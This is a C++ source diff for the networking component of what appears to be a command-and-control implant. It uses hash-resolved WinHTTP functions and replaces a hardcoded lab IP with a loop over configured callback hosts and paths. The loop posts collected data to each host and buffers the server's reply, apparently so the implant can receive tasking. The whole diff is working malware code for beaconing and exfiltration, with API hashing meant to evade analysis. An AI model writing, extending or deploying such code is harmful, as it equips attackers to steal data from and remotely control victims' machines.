@@ -2,6 +2,9 @@
 #include "../../includes/net/net.h"
 #include "../../includes/api/api.h"
 
+#define RECV_INITIAL_SIZE (64 * 1024)
+#define RECV_MAX_SIZE     (1024 * 1024)
+
 
 
 
@@ -30,6 +33,11 @@ BOOL NetMgr::Init() {
 
     hollow->Modules.winhttp = this->WinHttp;
 
+    this->recvBuf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, RECV_INITIAL_SIZE);
+    if (!this->recvBuf) { return FALSE; }
+    this->recvCap = RECV_INITIAL_SIZE;
+    this->recvLen = 0;
+
     if (this->httpApis) {
         this->httpApis->WinHttpOpen = (decltype(this->httpApis->WinHttpOpen))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpOpen);
         this->httpApis->WinHttpConnect = (decltype(this->httpApis->WinHttpConnect))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpConnect);
@@ -56,36 +64,105 @@ BOOL NetMgr::Init() {
 
 
 
-BOOL NetMgr::DoPost(PBYTE data, SIZE_T len) {
+BOOL NetMgr::EnsureRecv(SIZE_T needed) {
+    if (needed > RECV_MAX_SIZE)
+        return FALSE;
 
-    HINTERNET hSession, hConnect, hRequest = NULL;
-    DEBUG_LOGA("[+] Posting to http://192.168.1.18:8081/test");
+    if (needed <= this->recvCap)
+        return TRUE;
 
-    hSession = this->httpApis->WinHttpOpen(NULL,
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession)
-        goto CLEANUP;
-
-    hConnect = this->httpApis->WinHttpConnect(hSession, L"192.168.1.20", 8081, 0);
-    if (!hConnect)
-        goto CLEANUP;
-    hRequest = this->httpApis->WinHttpOpenRequest(hConnect, L"POST", L"/test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest)
-        goto CLEANUP;
-
-    if (!this->httpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)data, len, len, 0)) {
-        DEBUG_LOGA("[!]Failed Sending Request: %d\n", GetLastError());
-        goto CLEANUP;
+    SIZE_T newCap = this->recvCap ? this->recvCap : RECV_INITIAL_SIZE;
+    while (newCap < needed) {
+        if (newCap > RECV_MAX_SIZE / 2) {
+            newCap = RECV_MAX_SIZE;
+            break;
+        }
+        newCap *= 2;
     }
 
-CLEANUP:
-    if (hRequest) { this->httpApis->WinHttpCloseHandle(hRequest); }
-    if (hConnect) { this->httpApis->WinHttpCloseHandle(hConnect); }
-    if (hSession) { this->httpApis->WinHttpCloseHandle(hSession); }
+    HLOCAL p = hollow->Win32.LocalReAlloc(this->recvBuf, newCap, LMEM_FIXED | LMEM_ZEROINIT);
+    if (!p)
+        return FALSE;
 
+    this->recvBuf = (PBYTE)p;
+    this->recvCap = newCap;
     return TRUE;
+}
+
+
+BOOL NetMgr::DoPost(PBYTE data, SIZE_T len) {
+    this->recvLen = 0;
+
+    for (INT32 i = 0; i < hollow->config->net.TotalCallbacks; i++) {
+        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+        LPCWSTR path = L"/";
+        DWORD flags = 0, avail = 0, read = 0;
+        SIZE_T total = 0;
+        BOOL sent = FALSE;
+
+        DEBUG_LOGW(L"[+] Posting to %s", hollow->config->net.hosts[i].host);
+
+        hSession = this->httpApis->WinHttpOpen(NULL,
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            WINHTTP_NO_PROXY_NAME,
+            WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession)
+            goto NEXT;
+
+        hConnect = this->httpApis->WinHttpConnect(hSession, hollow->config->net.hosts[i].host, hollow->config->net.hosts[i].port, 0);
+        if (!hConnect)
+            goto NEXT;
+
+        if (hollow->config->net.TotalURIs > 0)
+            path = hollow->config->net.paths[i % hollow->config->net.TotalURIs].Path;
+        if (hollow->config->net.hosts[i].isHttps)
+            flags = WINHTTP_FLAG_SECURE;
+
+        hRequest = this->httpApis->WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+        if (!hRequest)
+            goto NEXT;
+
+        if (!this->httpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)data, (DWORD)len, (DWORD)len, 0)) {
+            DEBUG_LOGA("[!] Failed Sending Request: %lu", (unsigned long)GetLastError());
+            goto NEXT;
+        }
+
+        if (!this->httpApis->WinHttpReceiveResponse(hRequest, NULL))
+            goto NEXT;
+
+        for (;;) {
+            if (!this->httpApis->WinHttpQueryDataAvailable(hRequest, &avail))
+                goto NEXT;
+
+            if (avail == 0)
+                break;
+
+            if (!this->EnsureRecv(total + avail))
+                goto NEXT;
+
+            read = 0;
+            if (!this->httpApis->WinHttpReadData(hRequest, this->recvBuf + total, avail, &read))
+                goto NEXT;
+
+            if (read == 0)
+                break;
+
+            total += read;
+        }
+
+        this->recvLen = total;
+        sent = TRUE;
+
+    NEXT:
+        if (hRequest) { this->httpApis->WinHttpCloseHandle(hRequest); }
+        if (hConnect) { this->httpApis->WinHttpCloseHandle(hConnect); }
+        if (hSession) { this->httpApis->WinHttpCloseHandle(hSession); }
+
+        if (sent)
+            return TRUE;
+    }
+
+    return FALSE;
 }
 
 
